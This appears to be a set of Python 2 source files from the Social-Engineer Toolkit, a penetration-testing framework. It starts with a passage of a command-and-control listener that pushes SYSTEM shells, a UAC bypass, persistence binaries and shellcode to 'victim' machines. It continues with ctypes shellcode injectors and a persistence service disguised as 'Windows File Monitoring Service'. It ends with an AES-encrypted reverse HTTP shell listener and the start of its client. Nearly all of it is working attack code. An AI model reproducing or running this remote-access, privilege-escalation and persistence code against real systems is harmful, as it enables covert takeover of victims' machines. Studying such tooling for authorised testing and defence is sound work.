                        filewrite.write(data)
                        filewrite.close()
                        # grab our current path
                        definepath=os.getcwd()
                        print "[*] Filename: %s successfully downloaded." % (download_path)
                        print "[*] File stored at: %s/%s" % (definepath,download_path)


                # lock workstation
                if data == "lockworkstation":
                    print "[*] Sending the instruction to lock the victims workstation..."
                    send_packet(data, conn, encryption)
                    print "[*] Victims workstation has been locked..."

                # grabsystem
                if data == "grabsystem":

                    data = "getsystem"

                    # send that we want to upload a file to the victim controller
                    send_packet(data, conn, encryption)

                    time.sleep(0.5)

                    write_path= "not needed"

                    send_packet(write_path, conn, encryption)

                    # specify null variable to store our buffer for our file
                    data_file = ""

                    if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                        upload = "src/payloads/set_payloads/shell.windows"

                    if os.path.isfile("shell.windows"):
                        upload = "shell.windows"

                    if os.path.isfile(upload):
                        fileopen = file(upload, "rb")

                        print "[*] Attempting to upload interactive shell to victim machine."

                        # open file for reading
                        data_file = fileopen.read()
                        fileopen.close()

                        # send the file line by line to the system
                        send_packet(data_file, conn, encryption)

                        # receive length of confirmation
                        data = conn.recv(1024)
                        # decrypt the confirmation
                        data = decrypt_packet(data,encryption)
                        # now receive confirmation
                        data = conn.recv(int(data))
                        # encrypt our confirmation or failed upload
                        data = decrypt_packet(data,encryption)

                        # if we were successful
                        if data == "Confirmed":
                            print "[*] SET Interactive shell successfully uploaded to victim."

                        # if we failed
                        if data == "Failed":
                            print "[!] File had an issue saving to the victim machine. Try Again?"

                    # delay 5 seconds
                    time.sleep(0.5)

                    # write out system
                    if os.path.isfile("%s/system.address" % (setdir)):
                        os.remove("%s/system.address" % (setdir))
                    filewrite = file("%s/system.address" % (setdir), "w")
                    filewrite.write(addr)
                    filewrite.close()


                    # send the ipaddress and port for reverse connect back
                    send_packet(ipaddress, conn, encryption)

                    print "[*] You should have a new shell spawned that is running as SYSTEM in a few seconds..."

                # bypassuac
                if data == "bypassuac":

                    # define uac string

                    # had to do some funky stuff here because global vars are not working properly
                    # inside threads, so the information cant be passed to normal outside routines
                    if os.path.isfile(setdir + "/uac.address"):
                        os.remove(setdir + "/uac.address")
                    filewrite = file(setdir + "/uac.address", "w")
                    filewrite.write(addr)
                    filewrite.close()

                    # send that we want to upload a file to the victim controller
                    send_packet(data, conn, encryption)

                    time.sleep(0.5)

                    # now that we're inside that loop on victim we need to give it parameters
                    # we will send the write_path to the victim to prep the filewrite

                    write_path= "not needed"

                    # send packet over
                    send_packet(write_path, conn, encryption)

                    # specify null variable to store our buffer for our file
                    data_file = ""

                    if exe_platform == "x64":
                        if os.path.isfile("src/payloads/set_payloads/uac_bypass/x64.binary"):
                            upload = "src/payloads/set_payloads/uac_bypass/x64.binary"

                        if os.path.isfile("uac_bypass/x64.binary"):
                            upload = "uac_bypass/x64.binary"

                    if exe_platform == "x86":
                        if os.path.isfile("src/payloads/set_payloads/uac_bypass/x86.binary"):
                            upload = "src/payloads/set_payloads/uac_bypass/x86.binary"
                        if os.path.isfile("uac_bypass/x86.binary"):
                            upload = "uac_bypass/x86.binary"

                    if os.path.isfile(upload):
                        fileopen = file(upload, "rb")

                        print "[*] Attempting to upload UAC bypass to the victim machine."
                        # start a loop
                        data_file = fileopen.read()
                        fileopen.close()

                        # send the file line by line to the system
                        send_packet(data_file, conn, encryption)

                        # receive length of confirmation
                        data = conn.recv(1024)
                        # decrypt the confirmation
                        data = decrypt_packet(data,encryption)
                        # now receive confirmation
                        data = conn.recv(int(data))
                        # encrypt our confirmation or failed upload
                        data = decrypt_packet(data,encryption)

                        # if we were successful
                        if data == "Confirmed":
                            print "[*] Initial bypass has been uploaded to victim successfully."

                        # if we failed
                        if data == "Failed":
                            print "[!] File had an issue saving to the victim machine. Try Again?"

                    time.sleep(0.5)

                    # now that we're inside that loop on victim we need to give it parameters
                    # we will send the write_path to the victim to prep the filewrite

                    send_packet(write_path, conn, encryption)

                    # specify null variable to store our buffer for our file
                    data_file = ""

                    if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                        upload = "src/payloads/set_payloads/shell.windows"

                    if os.path.isfile("shell.windows"):
                        upload = "shell.windows"

                    if os.path.isfile(upload):
                        fileopen = file(upload, "rb")

                        print "[*] Attempting to upload interactive shell to victim machine."

                        # start a loop
                        data_file = fileopen.read()

                        fileopen.close()

                        # send the file line by line to the system
                        send_packet(data_file, conn, encryption)

                        # receive length of confirmation
                        data = conn.recv(1024)
                        # decrypt the confirmation
                        data = decrypt_packet(data,encryption)
                        # now receive confirmation
                        data = conn.recv(int(data))
                        # encrypt our confirmation or failed upload
                        data = decrypt_packet(data,encryption)

                        # if we were successful
                        if data == "Confirmed":
                            print "[*] SET Interactive shell successfully uploaded to victim."

                        # if we failed
                        if data == "Failed":
                            print "[!] File had an issue saving to the victim machine. Try Again?"

                    send_packet(ipaddress, conn, encryption)
                    print "[*] You should have a new shell spawned that is UAC safe in a few seconds..."

                # remove persistence
                if data == "removepersistence":
                    print "[*] Telling interactive shell to remove persistence from startup."
                    send_packet(data, conn, encryption)
                    print "[*] Service has been scheduled for deletion. It may take a reboot or when the 30 minute loop is finished."

                # persistence
                if data == "persistence":

                    # we place a try except block here, if UAC is enabled persistence fails for now

                    try:

                        # send that we want to upload a file to the victim controller for persistence
                        send_packet(data, conn, encryption)

                        time.sleep(0.5)

                        # now that we're inside that loop on victim we need to give it parameters
                        # we will send the write_path to the victim to prep the filewrite

                        write_path= "not needed"

                        # send packet over
                        send_packet(write_path, conn, encryption)

                        # specify null variable to store our buffer for our file
                        data_file = ""

                        if os.path.isfile("src/payloads/set_payloads/persistence.binary"):
                            if core_modules == True:
                                subprocess.Popen("cp src/payloads/set_payloads/persistence.binary %s" % (setdir), shell=True).wait()
                                upx("%s/persistence.binary" % (setdir))
                                upload = "%s/persistence.binary" % (setdir)
                            if core_modules == False:
                                upload = "src/payloads/set_payloads/persistence.binary"

                        if os.path.isfile("persistence.binary"):
                            upload = "persistence.binary"

                        if os.path.isfile(upload):
                            fileopen = file(upload, "rb")

                            print "[*] Attempting to upload the SET Interactive Service to the victim."
                            # start a loop
                            data_file = fileopen.read()
                            fileopen.close()

                            # send the file line by line to the system
                            send_packet(data_file, conn, encryption)

                            # receive length of confirmation
                            data = conn.recv(1024)
                            # decrypt the confirmation
                            data = decrypt_packet(data,encryption)
                            # now receive confirmation
                            data = conn.recv(int(data))
                            # encrypt our confirmation or failed upload
                            data = decrypt_packet(data,encryption)

                            # if we were successful
                            if data == "Confirmed":
                                print "[*] Initial service has been uploaded to victim successfully."

                            # if we failed
                            if data == "Failed":
                                print "[!] File had an issue saving to the victim machine. Try Again?"

                        time.sleep(0.5)

                        # now that we're inside that loop on victim we need to give it parameters
                        # we will send the write_path to the victim to prep the filewrite

                        send_packet(write_path, conn, encryption)

                        # specify null variable to store our buffer for our file
                        data_file = ""

                        if os.path.isfile("src/payloads/set_payloads/shell.windows"):
                            if core_modules == True:
                                subprocess.Popen("cp src/payloads/set_payloads/shell.windows %s" % (setdir), shell=True).wait()
                                upx(setdir + "/shell.windows")
                                upload = setdir + "/shell.windows"
                            if core_modules == False:
                                upload = "src/payloads/set_payloads/shell.windows"

                        if os.path.isfile("shell.windows"):
                            upload = "shell.windows"

                        if os.path.isfile(upload):
                            fileopen = file(upload, "rb")

                            print "[*] Attempting to upload SET Interactive Shell to victim machine."

                            # start a loop
                            data_file = fileopen.read()

                            fileopen.close()

                            # send the file line by line to the system
                            send_packet(data_file, conn, encryption)

                            # receive length of confirmation
                            data = conn.recv(1024)
                            # decrypt the confirmation
                            data = decrypt_packet(data,encryption)
                            # now receive confirmation
                            data = conn.recv(int(data))
                            # encrypt our confirmation or failed upload
                            data = decrypt_packet(data,encryption)

                            # if we were successful
                            if data == "Confirmed":
                                print "[*] SET Interactive shell successfully uploaded to victim."

                            # if we failed
                            if data == "Failed":
                                print "[!] File had an issue saving to the victim machine. Try Again?"

                        send_packet(ipaddress, conn, encryption)
                        print "[*] Service has been created on the victim machine. You should have a connection back every 30 minutes."

                    except Exception:
                        print "[!] Failed to create service on victim. If UAC is enabled this will fail. Even with bypassUAC."

                # if data is equal to upload
                if data == "upload":

                    # trigger our shell to go in downloadfile mode
                    data = "uploadfile"

                    # send that we want to upload a file to the victim controller
                    send_packet(data, conn, encryption)

                    time.sleep(0.5)

                    # now that we're inside that loop on victim we need to give it parameters
                    # we will send the write_path to the victim to prep the filewrite
                    send_packet(write_path, conn, encryption)


                    # specify null variable to store our buffer for our file
                    data_file = ""

                    if os.path.isfile(upload):
                        fileopen = file(upload, "rb")

                        print "[*] Attempting to upload %s to %s on victim machine." % (upload,write_path)
                        # start a loop
                        data_file = fileopen.read()
                        fileopen.close()

                        # send the file line by line to the system
                        send_packet(data_file, conn, encryption)

                        # receive length of confirmation
                        data = conn.recv(1024)
                        # decrypt the confirmation
                        data = decrypt_packet(data,encryption)
                        # now receive confirmation
                        data = conn.recv(int(data))
                        # encrypt our confirmation or failed upload
                        data = decrypt_packet(data,encryption)

                        # if we were successful
                        if data == "Confirmed":
                            print "[*] File has been uploaded to victim under path: " + write_path

                        # if we failed
                        if data == "Failed":
                            print "[!] File had an issue saving to the victim machine. Try Again?"

                    # if file wasn't found
                    else:
                        print "[!] File wasn't found. Try entering the path again."

                # if data == ssh_port_tunnel
                if data == "ssh_tunnel":

                    # let the server know it needs to switch to paramiko mode
                    data = "paramiko"
                    print "[*] Telling the victim machine we are switching to SSH tunnel mode.."
                    # send encrypted packet to victim
                    send_packet(data, conn, encryption)
                    # receive length of confirmation
                    data = conn.recv(1024)
                    # decrypt the confirmation
                    data = decrypt_packet(data,encryption)
                    # now receive confirmation
                    data = conn.recv(int(data))
                    # decrypt packet
                    data = decrypt_packet(data,encryption)
                    if data == "Paramiko Confirmed.":
                        print "[*] Acknowledged the server supports SSH tunneling.."
                        # send all the data over
                        data = ssh_server_ip + "," + ssh_server_port_address + "," + ssh_server_tunnel_port + "," + ssh_server_username + "," + ssh_server_password + "," + victim_server_port
                        # encrypt the packet and send it over
                        send_packet(data, conn, encryption)
                        print "[*] Tunnel is establishing, check IP Address: " + ssh_server_ip + " on port: " +ssh_server_tunnel_port
                        print "[*] As an example if tunneling RDP you would rdesktop localhost 3389"

                # list running processes
                if data == "ps":
                    # send encrypted packet to victim
                    send_packet(data, conn, encryption)

                    # recv data
                    data = conn.recv(1024)
                    data=decrypt_packet(data,encryption)

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = conn.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)

                    data=decrypt_packet(dataout,encryption)

                    print data

                # reboot server
                if data == "reboot now":
                    data = "reboot"
                    # send encrypted packet to victim
                    send_packet(data, conn, encryption)

                    # recv data
                    data = conn.recv(1024)
                    data=decrypt_packet(data,encryption)

                    MSGLEN = 0
                    dataout = ""
                    length = int(data)
                    while MSGLEN != length:
                        data = conn.recv(1024)
                        dataout += data
                        MSGLEN = MSGLEN + len(data)

                    data=decrypt_packet(dataout,encryption)

                    print data

                # if data is equal to pid kill
                if data == "kill":
                    # send encrypted packet to victim
                    send_packet(data, conn, encryption)

                    # send the pid of the packet we want
                    send_packet(pid_number, conn, encryption)

                    # wait for confirmation that it was killed
                    data = conn.recv(1024)
                    data=decrypt_packet(data,encryption)

                    print "[*] Process has been killed with PID: " + pid_number

                    data = conn.recv(1024)

                # if we are executing a command on the local operating system
                if data == "exec":
                    # execute the command via subprocess
                    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    # pipe output for stdout and stderr
                    stdout_value = proc.stdout.read()
                    stderr_value = proc.stderr.read()
                    data = stdout_value + stderr_value
                    print data


           # if data is equal to shellcode
                if data == "shellcode":

                    # send that we want to use shellcode to execute
                    send_packet(data, conn, encryption)

                    time.sleep(0.5)
                    # send the file line by line to the system
                    send_packet(shellcode_inject, conn, encryption)

        # handle the main exceptions
        except Exception, e:
            print "[!] Something went wrong printing error: " + str(e)
            log(e)
            count = 2
            garbage1 = ""
            garbage2 = ""
            garbage3 = ""
            thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))
            sys.exit() #exit_set()

        if data == "quit" or data == "exit" or data == "back":
            count = 2
            garbage1 = ""
            garbage2 = ""
            garbage3 = ""
            thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))

    print_status("The Social-Engineer Toolkit (SET) is listening on: 0.0.0.0:" + str(PORT))

    # define basic dictionary
    global d
    d = {}

    # function for updating dictionary
    def update_dict(conn,addr):
            # update dictionary
        d[conn] = addr[0]

    def call_connections(d,garbage1,garbage2,garbage3):
        global count
        count = 2
        counter = 1

        if false_shell == False:

                    #if tab_complete == True:
                    #        completer = Completer2()
                    #        readline.set_completer(completer.complete)

            while 1:
                try:
                    print "*** Pick the number of the shell you want ***\n"
                    for records in d.iteritems():
                        if records[1] != "127.0.0.1":
                            print str(counter)+": " + records[1]
                            counter += 1
                    print "\n"
                    # allow us to see connections running in the background
                    choice = raw_input(setprompt("0", ""))
                    choice = int(choice)
                    # if our choice is invalid because the user entered a higher number than what was listed, we then cycle back through the loop
                    if choice > counter - 1:
                        print "[!] Invalid choice, please enter a valid number to interact with."
                    if choice <= counter - 1:
                        break
                    counter = 1

                except ValueError:
                    counter = 1
                    if choice == "quit" or choice == "exit" or choice == "back":
                        print_status("Returning back to the main menu.")
                        break
                    if len(choice) != 0:
                        choice = str(choice)
                        print "[!] Invalid choice, please enter a valid number to interact with."

            if choice == "quit" or choice == "exit" or choice == "back":
                choice = 1
                sockobj = socket.socket(AF_INET, SOCK_STREAM)
                sockobj.connect(('', PORT))

            choice = int(choice) - 1

            # counter to dictionary
            dict_point = 0

            for records in d.iteritems():

                # pull our socket handle
                if choice == dict_point:

                    # grab socket handler
                    conn = records[0]
                    # grab address
                    addr = records[1]

                    # needed to unhose address name and to identify if we need to add
                    # additional flags. This is a temporary workaround, will add a full
                    # fledge handler of flags soon.
                    #
                    # addr = addr.replace(":UAC-Safe", "")
                    # addr = addr.replace("WINDOWS:SYSTEM", "")
                    # addr = addr.replace(":POSIX", "")
                    # addr = addr.replace(":WINDOWS:UAC-SAFE", "")
                    # addr = addr.replace(":WINDOWS", "")

                    # call our shell handler
                    thread.start_new_thread(handle_connection,(conn,addr,encryption,operating_system))

                # increment dict_point until we hit choice
                dict_point += 1


    try:
        while 1:

            if tab_complete == True:
                completer = Completer2()
                readline.set_completer(completer.complete)

            # connection and address for victim
            conn, addr = mysock.accept()

            # bypass counter
            bypass_counter = 0

            # if for some reason we got something connecting locally just bomb out
            if addr[0] == "127.0.0.1":
                conn.close()
                sys.exit() # pass

            # here we test to see if the SET shell is really there or someone
            # connected to it.
            false_shell = False
            if addr[0] != "127.0.0.1":
                try:
        # we set a 5 second timeout for socket to send data
                    data=conn.recv(27)

                except Exception, e:
                    print e
                    false_shell = True

                # if it isn't windows
                if data != "IHAYYYYYIAMSETANDIAMWINDOWS":
                    # if it isn't nix
                    if data != "IHAYYYYYIAMSETANDIAMPOSIXXX":
                        false_shell = True

                # if we have a windows shell
                if data == "IHAYYYYYIAMSETANDIAMWINDOWS":

                    if os.path.isfile(setdir + "/system.address"):
                        fileopen = file(setdir + "/system.address", "r")
                        system = fileopen.read().rstrip()
                        system = system.replace(":WINDOWS", "")
                        system = system.replace(":UAC-SAFE", "")
                        if str(addr[0]) == str(system):
                            temp_addr = str(addr[0] + ":WINDOWS:SYSTEM")
                            bypass_counter = 1

                    if os.path.isfile(setdir + "/uac.address"):
                        fileopen = file(setdir + "/uac.address", "r")
                        uac = fileopen.read().rstrip()
                        uac = uac.replace(":WINDOWS", "")
                        if str(addr[0]) == str(uac):
                            temp_addr = str(addr[0] + ":WINDOWS:UAC-SAFE")
                            bypass_counter = 1

                    if bypass_counter != 1:
                        temp_addr = str(addr[0] + ":WINDOWS")

                    temp_pid = str(addr[1])
                    temp_addr = [temp_addr, temp_pid]
                    update_dict(conn,temp_addr)
                    operating_system = "windows"
                    bypass_counter = 1

                # if we have a nix shell
                if data == "IHAYYYYYIAMSETANDIAMPOSIXXX":
                    temp_addr = str(addr[0] + ":POSIX")
                    temp_pid = str(addr[1])
                    temp_addr = [temp_addr, temp_pid]
                    update_dict(conn,temp_addr)
                    operating_system = "posix"
                    bypass_counter = 1

            if bypass_counter == 0:
                if addr[0] != "127.0.0.1":
                    if false_shell == False:
                        update_dict(conn,addr)

            # reset value
            # if uac != None:
            if os.path.isfile(setdir + "/uac.address"):
                os.remove(setdir + "/uac.address")
                bypass_counter = 0

            if os.path.isfile(setdir + "/system.address"):
                os.remove(setdir + "/system.address")
                bypass_counter = 0

            if addr[0] != "127.0.0.1":
                if false_shell == False:
                    print "[*] Connection received from: " + addr[0] + "\n"

            # set the counter if we get more threads that are legitimate
            if false_shell == False:
                count += 1

            try:

                # the first time we try this we dont want to start anything else
                if count == 1:
                            # call our main caller handler
                    garbage1 = ""
                    garbage2 = ""
                    garbage3 = ""
                    thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))

            except TypeError, e: # except typerrors
                log(e)
                garbage1 = ""
                garbage2 = ""
                garbage3 = ""
                thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))

            except Exception, e: # handle exceptions
                print "[!] Something went wrong. Printing error: " + str(e)
                log(e)
                garbage1 = ""
                garbage2 = ""
                garbage3 = ""
                thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))

    # handle control-c
    except KeyboardInterrupt:
        exit_menu()
        sys.exit(-1)

    # handle all exceptions
    except Exception, e:
        print_error("Something went wrong: ")
        print bcolors.RED + str(e) + bcolors.ENDC
        count = 2
        garbage1 = ""
        garbage2 = ""
        garbage3 = ""
        thread.start_new_thread(call_connections,(d,garbage1,garbage2,garbage3))
        log(e)
        sys.exit()

# if we are calling from cli
#if __name__ == '__main__':
start_listener()

########NEW FILE########
__FILENAME__ = multi_pyinjector
#
# The Social-Engineer Toolkit Multi-PyInjector revised and simplified version.
# Version: 0.4
# 
# This will spawn only a seperate thread per each shellcode instance.
#
# Much cleaner and optimized code. No longer needs files and is passed via
# command line.
#
# Incorporates AES 256 Encryption when passing shellcode

import ctypes
import sys
import subprocess
import os
import base64
from Crypto.Cipher import AES
import multiprocessing
import threading

# define our shellcode injection code through ctypes
def injection(sc):
    sc = sc.decode("string_escape")
    sc = bytearray(sc)
    # Initial awesome code and credit found here:
    # http://www.debasish.in/2012_04_01_archive.html 

    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(sc)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                       ctypes.c_int(len(sc)))
    buf = (ctypes.c_char * len(sc)).from_buffer(sc)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(sc)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
if __name__ == '__main__':
    multiprocessing.freeze_support()
    subprocess.Popen("netsh advfirewall set global StatefulFTP disable", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
    # this will be our ultimate filename we use for the shellcode generate
    # by the Social-Engineer Toolkit
    try:
        
        # our file containing shellcode
        if len(sys.argv[1]) > 1:
            payload_filename = sys.argv[1]
            if os.path.isfile(payload_filename):
                fileopen = file(payload_filename, "r")
                sc = fileopen.read()

            # if we didn't file our shellcode path then exit out
            if not os.path.isfile(payload_filename):
                sys.exit()
    
        if len(sys.argv[2]) > 1:
            # this is our secret key for decrypting the AES encrypted traffic
            secret = sys.argv[2]
            secret = base64.b64decode(secret)
            # the character used for padding--with a block cipher such as AES, the value
            # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
            # used to ensure that your value is always a multiple of BLOCK_SIZE
            PADDING = '{'
            BLOCK_SIZE = 32
            # one-liner to sufficiently pad the text to be encrypted
            pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
            # one-liners to decrypt a string which will be our shellcode
            DecryptAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
            cipher = AES.new(secret)
            # our decrypted value for shellcode
            sc = DecryptAES(cipher, sc)
            # split our shellcode into a list
            sc = sc.split(",")
        
    # except an indexerror and allow it to continue forward
    except IndexError:
        sys.exit()
    
    jobs = []
    for payload in sc:
        if payload != "":
            p = multiprocessing.Process(target=injection, args=(payload,))
            jobs.append(p)
            p.start()


########NEW FILE########
__FILENAME__ = persistence
#!/usr/bin/python
#
#####################################################################################################################
#
#                               Social-Engineer Toolkit Persistence Service
#
# Right now this is a pretty lame attempt at a service but will grow over time. The text file it reads in from isn't
# really a good idea, but it's a start.
#
#####################################################################################################################
#
# ex usage: persistence.exe install, start, stop, remove
#
# You can see output of this program running python site-packages\win32\lib\win32traceutil for debugging
#
#####################################################################################################################

import win32service
import win32serviceutil
import win32event
import win32evtlogutil
import win32traceutil
import servicemanager
import winerror
import time
import sys
import os
import subprocess

class aservice(win32serviceutil.ServiceFramework):
    _svc_name_ = "windows_monitoring"
    _svc_display_name_ = "Windows File Monitoring Service"
    _svc_deps_ = ["EventLog"]

    def __init__(self,args):
        win32serviceutil.ServiceFramework.__init__(self,args)
        self.hWaitStop=win32event.CreateEvent(None, 0, 0, None)
        self.isAlive=True

    def SvcStop(self):
        # tell Service Manager we are trying to stop (required)
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        # set the event to call
        win32event.SetEvent(self.hWaitStop)
        self.isAlive=False

    def SvcDoRun(self):
        import servicemanager
        # wait for beeing stopped ...
        self.timeout=1000  # In milliseconds (update every second)
        while self.isAlive:
            # wait for service stop signal, if timeout, loop again
            rc=win32event.WaitForSingleObject(self.hWaitStop, self.timeout)
            # expand the filesystem path
            windir=os.environ['WINDIR']
            # grab homepath
            homedir_path = os.getenv("SystemDrive")
            homedir_path = homedir_path + "\\Program Files\\Common Files\\"
            # pull the windows operating system version number
            windows_version = sys.getwindowsversion()[2]
            # pull integer of version number
            windows_version = int(windows_version)
            # windows XP and below
            if windows_version < 3791:
                fileopen=file("%s\\system32\\isjxwqjs" % (windir), "r")
            # windows 7, vista, 2008, etc. that might have UAC so we write to AppData instead
            if windows_version > 3791:
                fileopen=file("%s\\isjxwqjs" % (homedir_path), "r")
            for line in fileopen:
                # pull set-path, this is pulled from interactive shell and written when persistence is called
                set_path=line.rstrip()
            # specify filename to execute the SET interactive shell
            subprocess.Popen('%s'  % (set_path), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # sleep 30 mins
            time.sleep(1800)
            self.ReportServiceStatus(win32service.SERVICE_STOPPED)
        return

if __name__ == '__main__':

    # f its called with arguments then run
    if len(sys.argv) == 1:
        try:
            evtsrc_dll = os.path.abspath(servicemanager.__file__)
            servicemanager.PrepareToHostSingle(aservice)
            servicemanager.Initialize('aservice', evtsrc_dll)
            servicemanager.StartServiceCtrlDispatcher()
        except win32service.error, details:
            if details[0] == winerror.ERROR_FAILED_SERVICE_CONTROLLER_CONNECT:
                win32serviceutil.usage()
    else:
        win32serviceutil.HandleCommandLine(aservice)

########NEW FILE########
__FILENAME__ = pyinjector_args
#!/usr/bin/python
import ctypes
import sys
# Written by Dave Kennedy (ReL1K) @ TrustedSec.com
# Injects shellcode into memory through Python and ctypes
#
# Initial awesome code and credit found here:
# http://www.debasish.in/2012_04_01_archive.html 

# see if we specified shellcode
try:
    sc = sys.argv[1]

# if we didn't specify a param
except IndexError:
    sys.exit()

# need to code the input into the right format through string escape
sc = sc.decode("string_escape")

# convert to bytearray
sc = bytearray(sc)

# use types windll.kernel32 for virtualalloc reserves region of pages in virtual address space
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(sc)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

# use virtuallock to lock region for physical address space
ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                   ctypes.c_int(len(sc)))

# read in the buffer
buf = (ctypes.c_char * len(sc)).from_buffer(sc)

#  moved the memory in 4 byte blocks
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(sc)))
# launch in a thread 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
# waitfor singleobject
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

########NEW FILE########
__FILENAME__ = set_http_server
#!/usr/bin/python
############################################
#
#
# AES Encrypted Reverse HTTP Listener by:
#
#        Dave Kennedy (ReL1K)
#     https://www.trustedsec.com
#
#
############################################
from BaseHTTPServer import BaseHTTPRequestHandler
from BaseHTTPServer import HTTPServer
import urlparse
import re
import os
import base64
from Crypto.Cipher import AES
import sys
import time
from src.core.setcore import *

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32
# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'
# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# 32 character secret key - change this if you want to be unique
secret = "(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"

# create a cipher object using the random secret
cipher = AES.new(secret)

# url decode for postbacks
def htc(m):
    return chr(int(m.group(1),16))

# url decode
def urldecode(url):
    rex=re.compile('%([0-9a-hA-H][0-9a-hA-H])',re.M)
    return rex.sub(htc,url)

class GetHandler(BaseHTTPRequestHandler):

    # handle get request
    def do_GET(self):

        # this will be our shell command
        message = raw_input("shell> ")
        # if we specify quit, then sys arg out of the shell
        if message == "quit" or message == "exit":
            print ("\nExiting the SET RevShell Listener... ")
            time.sleep(2)
            sys.exit()
        # send a 200 OK response
        self.send_response(200)
        # end headers
        self.end_headers()
        # encrypt the message
        message = EncodeAES(cipher, message)
        # base64 it
        message = base64.b64encode(message)
        # write our command shell param to victim
        self.wfile.write(message)
        # return out
        return

    # handle post request
    def do_POST(self):

        # send a 200 OK response
        self.send_response(200)
        # # end headers
        self.end_headers()
        # grab the length of the POST data
        length = int(self.headers.getheader('content-length'))
        # read in the length of the POST data
        qs = self.rfile.read(length)
        # url decode
        url=urldecode(qs)
        # remove the parameter cmd
        url=url.replace("cmd=", "")
        # base64 decode
        message = base64.b64decode(url)
        # decrypt the string
        message = DecodeAES(cipher, message)
        # display the command back decrypted
        print message

#if __name__ == '__main__':
try:
    # bind to all interfaces
    if check_options("PORT=") != 0:
        port = check_options("PORT=")

    else:
        port = 443

    server = HTTPServer(('', int(port)), GetHandler)
    print """############################################
#
# The Social-Engineer Toolkit (SET) HTTP RevShell
#
#        Dave Kennedy (ReL1K)
#     https://www.trustedsec.com
#
############################################"""
    print 'Starting encrypted web shell server, use <Ctrl-C> to stop'
    # simple try block
    try:
        # serve and listen forever
        server.serve_forever()
    # handle keyboard interrupts
    except KeyboardInterrupt:
        print "[!] Exiting the encrypted webserver shell.. hack the gibson."
except Exception, e:
    print "Something went wrong, printing error: " + e

########NEW FILE########
__FILENAME__ = shell
#!/usr/bin/env python
from socket import *
import subprocess
import sys
import os
import base64
import binascii
import threading
import select
import thread
import time
import random
import string
import sys
import logging
import paramiko
import tempfile
import ctypes

# detect if we're on windows
if os.name == "nt":
    operating_system = "windows"
    import win32process,win32api, win32con, pythoncom, pyHook, win32security
    from ntsecuritycon import *

# detect if we're on nix
if os.name == "posix":
    operating_system = "posix"

###################################################################################################################
#
# win32process is a third party module, will need to include it, download the windows binaries, be sure to use
# python 2.5, pyinstaller doesn't like anything above it for the byte compiling.
#
# Note to get pyinstaller to work it was compiled under Python 2.5, be sure to install things manually and
# not through Activestate.
#
# Download win32 modules needed for shell here:
# http://sourceforge.net/projects/pywin32/files/pywin32/Build216/pywin32-216.win32-py2.5.exe/download
#
# You will also need pyCrypto, it's a pain to install if you do it from source, should get the binary modules
# to make it easier. Can download from here:
# http://www.voidspace.org.uk/cgi-bin/voidspace/downman.py?file=pycrypto-2.0.1.win32-py2.5.zip
#
# Will need to download pyHooks from:
# http://sourceforge.net/projects/pyhook/files/pyhook/1.5.1/pyHook-1.5.1.win32-py2.5.exe/download
#
# Be sure to pack it via UPX first in order for the UPX encoding to work properly within SET.
#
##################################################################################################################
#
#
##################################################################################################################
#
# Below is the steps used to compile the binary. py2exe requires a dll to be used in conjunction
# so py2exe was not used. Instead, pyinstaller was used in order to byte compile the binary.
#
# Remember to use Python 2.5 for Windows, nothing above and don't use ActiveState, things break.
#
#################################################################################################################
#
#
#################################################################################################################
#
# For OSX installation, install ActiveState Python 2.7 and type:
#
# sudo pypm install paramiko
#
# You will then need to go into Configure.py in pyinstaller and look for "64bit". Change it to
# something garbage like  dsifsdfidsfdshfois. This is a bug if it detects OSX in 64bit it will
# completely bomb. We fix it with the export VERSIONER below but it was still causing issues.
